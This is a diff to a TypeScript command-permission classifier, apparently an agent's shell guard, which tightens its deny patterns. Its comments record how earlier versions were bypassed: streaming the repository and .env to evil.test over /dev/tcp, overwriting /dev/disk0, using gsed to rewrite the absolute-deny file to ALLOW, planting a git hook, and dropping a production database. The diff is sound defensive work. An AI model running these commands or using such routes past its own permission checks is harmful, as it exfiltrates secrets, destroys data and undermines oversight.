@@ -1384,7 +1384,7 @@ export function stripToolGlobalOptions(head: string, tokens: string[]): { rest: 
             // the same SHAPE rule as CONFIG_PROGRAM_VERBS: a key that ends in one of git's program-valued words
             // names a program git will run, and enumerating them left `trailer.<t>.command`, `gpg.program` and
             // every other one off the list reaching ALLOW (exit review 6)
-            /^(core\.hooksPath|core\.fsmonitor|core\.editor|core\.pager|core\.sshCommand|core\.gitProxy|core\.askPass|init\.templateDir|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|alias\.|credential\.|http\.|remote\.|url\.|include\.|includeIf\.|diff\.external|filter\.|receive\.|uploadpack\.|protocol\.)|\.(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshcommand|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter)=/i.test(
+            /^(core\.hooksPath|core\.fsmonitor|core\.editor|core\.pager|core\.sshCommand|core\.gitProxy|core\.askPass|init\.templateDir|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|alias\.|credential\.|http\.|remote\.|url\.|include\.|includeIf\.|diff\.external|filter\.|receive\.|uploadpack\.|protocol\.|pager\.|difftool\.|mergetool\.|guitool\.|trailer\.|gpg\.|ssh\.|fsmonitor\.)|\.(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshcommand|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter)=/i.test(
               value,
             )
           )
@@ -1406,7 +1406,7 @@ export function stripToolGlobalOptions(head: string, tokens: string[]): { rest: 
         if (!m) continue;
         const value = m[2] ?? restGit[k + 1] ?? '';
         if (
-          /^(core\.hooksPath|core\.fsmonitor|core\.editor|core\.pager|core\.sshCommand|core\.gitProxy|core\.askPass|init\.templateDir|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|alias\.|credential\.|http\.|remote\.|url\.|include\.|includeIf\.|diff\.external|filter\.|receive\.|uploadpack\.|protocol\.)|\.(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshcommand|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter)=/i.test(
+          /^(core\.hooksPath|core\.fsmonitor|core\.editor|core\.pager|core\.sshCommand|core\.gitProxy|core\.askPass|init\.templateDir|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|alias\.|credential\.|http\.|remote\.|url\.|include\.|includeIf\.|diff\.external|filter\.|receive\.|uploadpack\.|protocol\.|pager\.|difftool\.|mergetool\.|guitool\.|trailer\.|gpg\.|ssh\.|fsmonitor\.)|\.(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshcommand|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter)=/i.test(
             value,
           )
         )
@@ -1495,10 +1495,13 @@ const NET_DEVICE_RE = /^\/dev\/(tcp|udp)\/([^/]+)\/([^/]+)$/;
  *  an absolute deny into ALLOW for any path on the machine. And it excludes the network pseudo-paths, which are
  *  sockets: `tar czf - . > /dev/tcp/evil.test/443` streamed the whole repository, `.git` and `.env` included, to
  *  an arbitrary host at ALLOW, with no network binary anywhere on the line (exit review 7). */
+const BLOCK_DEVICE_RE = /^\/dev\/r?(disk|sd|hd|nvme|vd|xvd|mmcblk|loop)\w*$/;
 function isDeviceDiscard(path: string): boolean {
   const a = path.startsWith('/') ? resolve(path) : path;
   if (a !== '/dev' && !a.startsWith('/dev/')) return false;
-  return !NET_DEVICE_RE.test(a);
+  // `/dev/null` and `/dev/tty` swallow what they are given; `/dev/disk0` is the DISK, and `cp /dev/zero
+  // /dev/disk0` overwrites it (exit review 7). A raw block device is a destination, not a discard.
+  return !NET_DEVICE_RE.test(a) && !BLOCK_DEVICE_RE.test(a);
 }
 /** Verbs whose effect on the path they name is irreversible, so an unreadable operand is a gap rather than noise. */
 const DESTRUCTIVE_HEADS = new Set(['rm', 'unlink', 'rmdir', 'shred', 'mv', 'truncate', 'chmod', 'chown', 'dd']);
@@ -1830,6 +1833,13 @@ export function isScratchPath(abs: string): boolean {
 const WRITE_HEADS = new Set([
   'cp',
   'mv',
+  // the GNU-named twins macOS installs: `gsed -i` edits in place exactly as `sed -i` does, and the destination
+  // rules never saw it, so `gsed -i 's/DENY/ALLOW/' control-plane/permissions/absolute-denies.md` rewrote the
+  // absolute denies themselves at ALLOW (exit review 7)
+  'gsed',
+  'gawk',
+  'gcp',
+  'gmv',
   'sort',
   'uniq',
   'yq',
@@ -2194,7 +2204,7 @@ function childEnvironment(
 /** Which process inputs materially change what each producer resolves. EGO does not model the environment: it
  *  captures only the inputs required to justify the semantic claim the producer is about to make. */
 const PROGRAM_NAMING_ENV =
-  /^(EDITOR|VISUAL|PAGER|DIFFPROG|MERGE|SSH_ASKPASS|SUDO_ASKPASS|TERMINAL|BROWSER|MANPAGER|LESSOPEN|LESSCLOSE|CC|CXX|LD|AR|RANLIB|OBJCOPY|CARGO_TARGET_[A-Z0-9_]*RUNNER|RUSTC_WRAPPER|RUSTC|LD_PRELOAD|DYLD_[A-Z_]+|GOFLAGS|RUSTFLAGS|CGO_[A-Z]+|CFLAGS|CXXFLAGS|LDFLAGS)$/;
+  /^(EDITOR|VISUAL|PAGER|DIFFPROG|MERGE|SSH_ASKPASS|SUDO_ASKPASS|TERMINAL|BROWSER|MANPAGER|LESSOPEN|LESSCLOSE|CC|CXX|LD|AR|RANLIB|OBJCOPY|CARGO_TARGET_[A-Z0-9_]*RUNNER|CARGO_BUILD_[A-Z0-9_]*(WRAPPER|RUSTC|RUSTDOC)|RUSTC_WRAPPER|RUSTC|LD_PRELOAD|DYLD_[A-Z_]+|GOFLAGS|RUSTFLAGS|CGO_[A-Z]+|CFLAGS|CXXFLAGS|LDFLAGS)$/;
 
 const RELEVANT_ENV_INPUTS: Record<ProducerResult['kind'], readonly RegExp[]> = {
   // A variable whose VALUE IS A PROGRAM re-points the tool itself, so it is relevant to EVERY producer and to no
@@ -2320,7 +2330,7 @@ const TREE_CHANGING =
 const EXECUTION_ENV_INPUTS =
   // ... plus the variables whose VALUE IS A PROGRAM the tool will run: an editor, a pager, a diff or merge
   // driver, an askpass helper. `EDITOR=<prog> git commit` runs <prog> (decision challenge, finding 33).
-  /^(MAKEFILES|MAKEFLAGS|MAKE|GNUMAKEFLAGS|SHELL|BASH_ENV|ENV|PS4|BASH_XTRACEFD|CDPATH|PATH|NODE_OPTIONS|NODE_PATH|npm_config_[a-z_]+|YARN_[A-Z_]+|PNPM_[A-Z_]+|BUN_[A-Z_]+|PYTHONPATH|PYTHONSTARTUP|PERL5OPT|RUBYOPT|GIT_[A-Z_]+|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]+|EDITOR|VISUAL|PAGER|DIFFPROG|MERGE|SSH_ASKPASS|SUDO_ASKPASS|TERMINAL|BROWSER|MANPAGER|LESSOPEN|LESSCLOSE|CC|CXX|LD|AR|RANLIB|OBJCOPY|CARGO_TARGET_[A-Z0-9_]*RUNNER|RUSTC_WRAPPER|RUSTC|SWIFT_EXEC|JAVA_TOOL_OPTIONS|JDK_JAVA_OPTIONS|_JAVA_OPTIONS|LD_AUDIT|BUILDX_BUILDER|DOCKER_HOST|DOCKER_CONTEXT|CONTAINER_HOST|KUBECONFIG|KUBE_CONTEXT|AWS_ENDPOINT_URL|AWS_ENDPOINT_URL_[A-Z0-9_]+|AWS_S3_ENDPOINT|CLOUDSDK_API_ENDPOINT_OVERRIDES_[A-Z0-9_]+|(?:STORAGE|PUBSUB|FIRESTORE|DATASTORE|BIGTABLE|SPANNER)_EMULATOR_HOST|GOFLAGS|GOTOOLCHAIN|RUSTFLAGS|CGO_[A-Z]+|CFLAGS|CXXFLAGS|LDFLAGS|MAKEFLAGS)$/;
+  /^(MAKEFILES|MAKEFLAGS|MAKE|GNUMAKEFLAGS|SHELL|BASH_ENV|ENV|PS4|BASH_XTRACEFD|CDPATH|PATH|NODE_OPTIONS|NODE_PATH|npm_config_[a-z_]+|YARN_[A-Z_]+|PNPM_[A-Z_]+|BUN_[A-Z_]+|PYTHONPATH|PYTHONSTARTUP|PERL5OPT|RUBYOPT|GIT_[A-Z_]+|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]+|EDITOR|VISUAL|PAGER|DIFFPROG|MERGE|SSH_ASKPASS|SUDO_ASKPASS|TERMINAL|BROWSER|MANPAGER|LESSOPEN|LESSCLOSE|CC|CXX|LD|AR|RANLIB|OBJCOPY|CARGO_TARGET_[A-Z0-9_]*RUNNER|RUSTC_WRAPPER|RUSTC|CARGO_BUILD_RUSTC_WRAPPER|CARGO_BUILD_RUSTC|CARGO_BUILD_RUSTDOC|RUSTDOC|SWIFT_EXEC|JAVA_TOOL_OPTIONS|JDK_JAVA_OPTIONS|_JAVA_OPTIONS|LD_AUDIT|BUILDX_BUILDER|DOCKER_HOST|DOCKER_CONTEXT|CONTAINER_HOST|KUBECONFIG|KUBE_CONTEXT|AWS_ENDPOINT_URL|AWS_ENDPOINT_URL_[A-Z0-9_]+|AWS_S3_ENDPOINT|CLOUDSDK_API_ENDPOINT_OVERRIDES_[A-Z0-9_]+|(?:STORAGE|PUBSUB|FIRESTORE|DATASTORE|BIGTABLE|SPANNER)_EMULATOR_HOST|GOFLAGS|GOTOOLCHAIN|RUSTFLAGS|CGO_[A-Z]+|CFLAGS|CXXFLAGS|LDFLAGS|MAKEFLAGS)$/;
 
 export function segmentEnvInputs(segment: string): Record<string, string> {
   const out: Record<string, string> = {};
@@ -2583,7 +2593,7 @@ function writtenPathOperands(segment: string, cwd: string): string[] {
   else if (head === 'dd') {
     const of = tokens.find((t) => t.startsWith('of='));
     if (of) out.push(abs(of.slice(3)));
-  } else if (/^(sed|perl)$/.test(head) && tokens.some((t) => /^-[a-z]*i/.test(t)) && operands.length)
+  } else if (/^(sed|gsed|perl|ruby|gawk)$/.test(head) && tokens.some((t) => /^-[a-z]*i/.test(t) || t === '--in-place') && operands.length)
     out.push(...operands.slice(1).map(abs));
   // A BUILD TOOL'S OUTPUT FLAG IS A WRITE DESTINATION. Every bundler, compiler and archiver names where it writes
   // with a flag, and none of them were read: `esbuild src/a.ts --outfile=.git/hooks/pre-commit` installed a git
@@ -4439,13 +4449,18 @@ const PROGRAM_OPERAND_LONG =
   '|-e(?=\\s+(?![A-Za-z_][A-Za-z0-9_]*=)(?:\\S*/)?(ssh|sh|bash|zsh|dash|python3?|perl|ruby|node)(\\s|$))';
 const PROGRAM_OPERAND_LONG_RE = new RegExp(`\\s(${PROGRAM_OPERAND_LONG})(=|\\s)`);
 /** the short forms whose value is GLUED to the letter: `gcc -B/tmp/evil`, `clang -Xclangfoo`, `-loadplugin` */
-const PROGRAM_OPERAND_GLUED_RE = /\s(-B|-Xclang|-load|-fplugin|-specs|-wrapper)\S/;
+const PROGRAM_OPERAND_GLUED_RE = /\s(-B|-Xclang|-Xplugin|-load|-fplugin|-specs|-wrapper|-agentlib|-agentpath|-javaagent)[:=]?\S/;
 /** the archive tools where a short `-I` names a compression PROGRAM (for make it is an include directory) */
 const PROGRAM_OPERAND_TOOL_RE = /^(tar|bsdtar|gtar|pax)\b/;
 const PROGRAM_OPERAND_RE = new RegExp(`\\s(${PROGRAM_OPERAND_LONG}|-I)(=|\\s)`);
 
 const DB_CLIENT_HEADS = new Set([
   'psql', 'mysql', 'mariadb', 'mongosh', 'mongo', 'sqlite3', 'redis-cli', 'clickhouse-client', 'cqlsh',
+  // ADMINISTRATION TOOLS ARE CLIENTS TOO. `mysqladmin -h prod-db.acme.com drop appdb` drops a production
+  // database and was not enrolled at all; `clickhouse client` is the two-word spelling of `clickhouse-client`
+  // (exit review 7).
+  'mysqladmin', 'mysqldump', 'mysqlsh', 'pg_dump', 'pg_restore', 'pg_dumpall', 'pgbench', 'createdb', 'dropdb',
+  'valkey-cli', 'influx', 'clickhouse',
 ]);
 const DB_EXECUTES_UNREAD =
   // `\!` is psql's shell escape. Inside DOUBLE quotes the backslash is consumed before this test ever sees it,
@@ -4462,10 +4477,11 @@ const TARGET_ENV_RE =
   // RESOLVER but not here, so the assignment was stripped as noise and never re-attached: the engine survived
   // only while the assignment happened to stay leading in the raw segment. Inside an `if`, a loop body, a `trap`
   // or a herestring it did not, and a shell on a production daemon asked (exit review 6, generated cross-product).
-  /^(PGHOST|PGHOSTADDR|PGSERVICE|PGDATABASE|PGPORT|PGURI|MYSQL_HOST|MYSQL_TCP_PORT|REDIS_HOST|REDIS_URL|MONGODB_URI|MONGO_URL|DATABASE_URL|FLYWAY_URL|KUBECONFIG|KUBERNETES_MASTER|KUBE_CONTEXT|CLICKHOUSE_HOST|DOCKER_HOST|DOCKER_CONTEXT|CONTAINER_HOST|BUILDX_BUILDER)$/;
+  /^(PGHOST|PGHOSTADDR|PGSERVICE|PGDATABASE|PGPORT|PGURI|MYSQL_HOST|MYSQL_TCP_PORT|REDIS_HOST|REDIS_URL|MONGODB_URI|MONGO_URL|DATABASE_URL|FLYWAY_URL|KUBECONFIG|KUBERNETES_MASTER|KUBE_CONTEXT|HELM_KUBECONTEXT|HELM_KUBEAPISERVER|CLICKHOUSE_HOST|DOCKER_HOST|DOCKER_CONTEXT|CONTAINER_HOST|BUILDX_BUILDER)$/;
 const TARGET_ENV_HEADS = new Set([
   'psql', 'mysql', 'mariadb', 'mongosh', 'mongo', 'redis-cli', 'clickhouse-client', 'cqlsh', 'sqlite3',
   'kubectl', 'oc', 'helm', 'kustomize', 'flyway', 'liquibase', 'alembic', 'dbmate', 'prisma', 'knex', 'sequelize',
+  'mysqladmin', 'mysqldump', 'pg_dump', 'pg_restore', 'pg_dumpall', 'createdb', 'dropdb', 'clickhouse',
   'docker', 'podman', 'nerdctl', 'docker-compose', 'podman-compose', 'lima', 'colima',
   // a runner does not change what the wrapped tool connects to
   'npx', 'pnpm', 'yarn', 'bunx', 'pnpx', 'bun', 'npm',
@@ -4627,6 +4643,14 @@ function classifyTargetName(
   return 'EXTERNAL';
 }
 
+/** The five names in `k8s_local_contexts` that are the CONTAINER RUNTIME's own words for the local daemon.
+ *  Kubernetes has no such convention: a kubeconfig context called `default` is whatever the operator's file
+ *  says, and `kubectl --context default apply -f evil.yaml` was read as local because the container list and the
+ *  Kubernetes list are one file (exit review 7). */
+const CONTAINER_ONLY_LOCAL = new Set(['default', 'unix', 'npipe', 'rootless', 'desktop-windows']);
+const k8sContexts = (targets: LocalTargets): string[] =>
+  targets.k8sLocalContexts.filter((c) => !CONTAINER_ONLY_LOCAL.has(c));
+
 /** Resolves the Kubernetes target of a normalized segment and whether the verb mutates it. */
 /** docker/podman global options that consume the next token, so their value is not the subcommand. */
 const DOCKER_GLOBAL_VALUE_OPTS =
@@ -4742,7 +4766,11 @@ function resolveContainerTarget(
     ...['plugin ls', 'plugin inspect', 'compose ls', 'compose ps', 'compose logs', 'compose config', 'compose images', 'compose top'],
   ]);
   const groups = new Set(['image', 'container', 'volume', 'network', 'system', 'context', 'builder', 'buildx', 'node', 'service', 'stack', 'secret', 'config', 'plugin', 'trust', 'swarm', 'compose', 'manifest', 'checkpoint']);
-  const positional = tokens.slice(1).filter((t) => !t.startsWith('-') && !signals.some((g) => g.target.endsWith(t)));
+  // A SIGNAL'S TARGET IS A VALUE, NOT A SUFFIX. The filter dropped every positional that the target string
+  // merely ENDS WITH, so `docker --context staging-run run -d …` lost its own verb — `context staging-run`
+  // ends with `run` — and a container started on a non-local engine reached ALLOW (exit review 7).
+  const signalValues = new Set(signals.map((g) => g.target.slice(g.target.indexOf(' ') + 1)));
+  const positional = tokens.slice(1).filter((t) => !t.startsWith('-') && !signalValues.has(t));
   const first = positional[0];
   const verb = first !== undefined && groups.has(first) && positional[1] !== undefined ? `${first} ${positional[1]}` : first;
   const isUse =
@@ -4807,8 +4835,8 @@ function resolveK8sTarget(
   // `kubectl config use-context X` re-points every later command at that cluster, exactly as `docker context
   // use` does — and that one was already classified (exit review 3).
   const useIdx = tokens.findIndex((t, i) => t === 'use-context' && tokens[i - 1] === 'config');
-  if (useIdx > 0 && tokens[useIdx + 1]) add([tokens[useIdx + 1]!], targets.k8sLocalContexts, 'context use');
-  add(optionValues(tokens, '', ['--context', '--kube-context']), targets.k8sLocalContexts, 'context');
+  if (useIdx > 0 && tokens[useIdx + 1]) add([tokens[useIdx + 1]!], k8sContexts(targets), 'context use');
+  add(optionValues(tokens, '', ['--context', '--kube-context']), k8sContexts(targets), 'context');
   // A NAMED LOCAL CONTEXT IS DECISIVE. `kind get kubeconfig > ./kube.conf` then `kubectl --kubeconfig ./kube.conf
   // --context kind-dev apply` is the documented kind workflow; the FILE is UNCLASSIFIED (the kernel cannot read
   // it) and outranked the context, so the whole local loop was DENIED (exit review 7). A kubeconfig says where
@@ -4817,7 +4845,7 @@ function resolveK8sTarget(
   const namedContext = optionValues(tokens, '', ['--context', '--kube-context']);
   const contextIsLocal =
     namedContext.length > 0 &&
-    namedContext.every((c) => classifyTargetName(c, targets.k8sLocalContexts, targets) === 'LOCAL') &&
+    namedContext.every((c) => classifyTargetName(c, k8sContexts(targets), targets) === 'LOCAL') &&
     // ...and only for a kubeconfig the WORKSPACE owns. `kind get kubeconfig > ./kube.conf` writes it into the
     // checkout; a file somewhere else is one the kernel cannot read and did not see created, and a pinned
     // bypass rests on exactly that (`--kubeconfig /tmp/remote.yaml --context kind-dev`, round 14).
@@ -4828,6 +4856,14 @@ function resolveK8sTarget(
   for (const t of tokens) {
     const env = /^(KUBECONFIG|KUBERNETES_MASTER)=(.+)$/.exec(t);
     if (env) signals.push({ cls: classifyTargetName(env[2]!, [], targets), target: env[1]! + '=' + env[2]! });
+    // helm reads its context from the environment too, and `HELM_KUBECONTEXT=production helm upgrade` was a
+    // production release nobody saw (exit review 7)
+    const ctxEnv = /^(HELM_KUBECONTEXT|KUBE_CONTEXT|HELM_KUBEAPISERVER)=(.+)$/.exec(t);
+    if (ctxEnv)
+      signals.push({
+        cls: classifyTargetName(ctxEnv[2]!, k8sContexts(targets), targets),
+        target: `${ctxEnv[1]!}=${ctxEnv[2]!}`,
+      });
   }
   // THE API SERVER IS AN ENDPOINT, so its HOST is what decides — `--server https://127.0.0.1:6443` names the
   // loopback cluster explicitly and was read as an opaque name, denying the very thing the local list exists to
@@ -5698,7 +5734,9 @@ function classifyShellPaths(
         'mkdir',
         'rmdir',
         'sed',
+        'gsed',
         'perl',
+        'ruby',
         'ln',
         'shred',
         'unlink',
@@ -5915,7 +5953,8 @@ function classifyShellPaths(
         continue;
       }
       // a device sink is a DISCARD, not a destination — the redirection form has always known this
-      const w = isDevPath(p.raw)
+      // a device is a DISCARD, but a raw block device is a disk and a `/dev/tcp` path is a socket: neither is
+      const w = isDevPath(p.raw) && isDeviceDiscard(p.raw)
         ? { verdict: 'ALLOW' as const, via: '', capability: '', absolute: false }
         : classifyPath(table, ctx, 'Write', p.abs);
       if (w.verdict !== 'ALLOW')
